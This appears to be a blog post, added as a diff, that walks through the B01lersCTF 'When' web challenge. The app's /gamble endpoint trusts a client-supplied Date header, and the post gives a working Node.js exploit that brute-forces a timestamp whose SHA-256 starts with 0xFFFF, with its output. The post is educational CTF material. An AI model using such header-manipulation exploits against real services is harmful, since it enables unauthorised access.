@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">B01lersCTF - When (Web) | Edward Pasenidis</title>
+<meta property="og:title" content="B01lersCTF - When (Web) | Edward Pasenidis" />
+<meta name="twitter:title" content="B01lersCTF - When (Web) | Edward Pasenidis" />
+<meta itemprop="name" content="B01lersCTF - When (Web) | Edward Pasenidis" />
+<meta name="application-name" content="B01lersCTF - When (Web) | Edward Pasenidis" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en" href="https://blog.pasenidis.com/posts/boilerctf-web-when/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2025-04-21T23:11:00&#43;0300 />
+    <meta property="article:published_time" content=2025-04-21T23:11:00&#43;0300 />
+    <meta property="og:url" content="https://blog.pasenidis.com/posts/boilerctf-web-when/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "B01lersCTF - When (Web)",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2025-04-21",
+        "description": "",
+        "wordCount":  564 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2025-04-21",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Edward Pasenidis"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.146.5">
+
+    
+    <meta property="og:url" content="https://blog.pasenidis.com/posts/boilerctf-web-when/">
+  <meta property="og:site_name" content="Edward Pasenidis">
+  <meta property="og:title" content="B01lersCTF - When (Web)">
+  <meta property="og:description" content="Overview The challenge is a small Express app in which a user can hit anywhere on the page to “gamble”.
+Reviewing the code After reading app.ts, we can see that there is a rate-limiter in place so directly bruteforcing via HTTP is obviously impossible. There is a gamble(number) function that returns a SHA-256, it is used to issue hashes from JavaScript dates.
+async function gamble(number: number) { return crypto.subtle.digest(&#34;SHA-256&#34;, Buffer.from(number.toString())) } Here comes the interesting part, the Express app serves a POST endpoint /gamble, which can optionally use a Date HTTP header to perform the “calculation”.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-21T23:11:00+03:00">
+    <meta property="article:modified_time" content="2025-04-21T23:11:00+03:00">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="B01lersCTF - When (Web)">
+  <meta name="twitter:description" content="Overview The challenge is a small Express app in which a user can hit anywhere on the page to “gamble”.
+Reviewing the code After reading app.ts, we can see that there is a rate-limiter in place so directly bruteforcing via HTTP is obviously impossible. There is a gamble(number) function that returns a SHA-256, it is used to issue hashes from JavaScript dates.
+async function gamble(number: number) { return crypto.subtle.digest(&#34;SHA-256&#34;, Buffer.from(number.toString())) } Here comes the interesting part, the Express app serves a POST endpoint /gamble, which can optionally use a Date HTTP header to perform the “calculation”.">
+
+
+    
+
+    <link rel="canonical" href="https://blog.pasenidis.com/posts/boilerctf-web-when/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://blog.pasenidis.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+    
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://blog.pasenidis.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">B01lersCTF - When (Web)</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-04-21T23:11:00&#43;03:00" itemprop="datePublished"> Apr 21, 2025 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <h2 id="overview">Overview</h2>
+<p>The challenge is a small Express app in which a user can hit anywhere on the page to &ldquo;gamble&rdquo;.</p>
+<h2 id="reviewing-the-code">Reviewing the code</h2>
+<p>After reading <code>app.ts</code>, we can see that there is a rate-limiter in place so directly bruteforcing via HTTP is obviously impossible.
+There is a <code>gamble(number)</code> function that returns a SHA-256, it is used to issue hashes from JavaScript dates.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">gamble</span>(<span style="color:#a6e22e">number</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">number</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">subtle</span>.<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#34;SHA-256&#34;</span>, <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">number</span>.<span style="color:#a6e22e">toString</span>()))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here comes the interesting part, the Express app serves a POST endpoint <code>/gamble</code>, which can optionally use a <code>Date</code> HTTP header to perform the &ldquo;calculation&rdquo;.</p>
+<p>Let&rsquo;s see the code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/gamble&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">date</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">new</span> Date(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">date</span>) <span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> Date()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">number</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getTime</span>() <span style="color:#f92672">/</span> <span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isNaN(<span style="color:#a6e22e">number</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Bad Date&#34;</span>
+</span></span><span style="display:flex;"><span>        }).<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gamble</span>(<span style="color:#a6e22e">number</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bytes</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">data</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bytes</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">bytes</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">result</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1111111111111111&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;bctf{fake_flag}&#34;</span>
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">result</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">bytes</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">padStart</span>(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;0&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">bytes</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">padStart</span>(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The endpoint computes a SHA-256 hash from the Unix timestamp extracted from the Date header. If the first two bytes of the hash are 255, the server returns the flag.</p>
+<h2 id="writing-an-exploit">Writing an exploit</h2>
+<p>To pass the backend checks, we need to find a Unix timestamp <code>T</code> such that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">SHA256</span>(<span style="color:#a6e22e">T</span>.<span style="color:#a6e22e">toString</span>()))[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#ae81ff">255</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">SHA256</span>(<span style="color:#a6e22e">T</span>.<span style="color:#a6e22e">toString</span>()))[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">===</span> <span style="color:#ae81ff">255</span>
+</span></span></code></pre></div><p>We can brute-force locally since the same logic is used in the backend. Once we find the right value, we send a POST request with a <code>Date</code> header set to that exact time.</p>
+<p>Here&rsquo;s the full exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">crypto</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#34;crypto&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">gamble</span>(<span style="color:#a6e22e">number</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHash</span>(<span style="color:#e6db74">&#34;sha256&#34;</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">number</span>.<span style="color:#a6e22e">toString</span>()).<span style="color:#a6e22e">digest</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">findFF</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1e8</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gamble</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">hash</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#ae81ff">0xff</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">hash</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">===</span> <span style="color:#ae81ff">0xff</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Found it:&#34;</span>, <span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#34;Not found&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">findFF</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date(<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Timestamp:&#34;</span>, <span style="color:#a6e22e">timestamp</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Date:&#34;</span>, <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">toISOString</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gamble</span>(<span style="color:#a6e22e">timestamp</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;First two bytes:&#34;</span>, <span style="color:#a6e22e">hash</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">hash</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">table</span>(Array.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">hash</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://when.atreides.b01lersc.tf/gamble&#34;</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Date&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">toISOString</span>()
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">flag</span>)
+</span></span></code></pre></div><p>In less than a second, it finds the right timestamp and fetches the flag:</p>
+<pre tabindex="0"><code>Found it: 30398
+Timestamp: 30398
+Date: 1970-01-01T08:26:38.000Z
+First two bytes: 255 255
+┌─────────┬────────┐
+│ (index) │ Values │
+├─────────┼────────┤
+│ 0       │ 255    │
+│ 1       │ 255    │
+│ 2       │ 142    │
+│ 3       │ 213    │
+│ 4       │ 111    │
+│ 5       │ 101    │
+│ 6       │ 202    │
+│ 7       │ 240    │
+│ 8       │ 1      │
+│ 9       │ 159    │
+│ 10      │ 144    │
+│ 11      │ 214    │
+│ 12      │ 91     │
+│ 13      │ 127    │
+│ 14      │ 21     │
+│ 15      │ 139    │
+│ 16      │ 134    │
+│ 17      │ 46     │
+│ 18      │ 252    │
+│ 19      │ 171    │
+│ 20      │ 92     │
+│ 21      │ 69     │
+│ 22      │ 23     │
+│ 23      │ 167    │
+│ 24      │ 108    │
+│ 25      │ 1      │
+│ 26      │ 199    │
+│ 27      │ 58     │
+│ 28      │ 207    │
+│ 29      │ 146    │
+│ 30      │ 217    │
+│ 31      │ 155    │
+└─────────┴────────┘
+bctf{}
+</code></pre><h2 id="epilogue">Epilogue</h2>
+<p>Thanks for reading! Hope you had fun with this challenge.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/pasenidis" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/0x3dward" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://blog.pasenidis.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
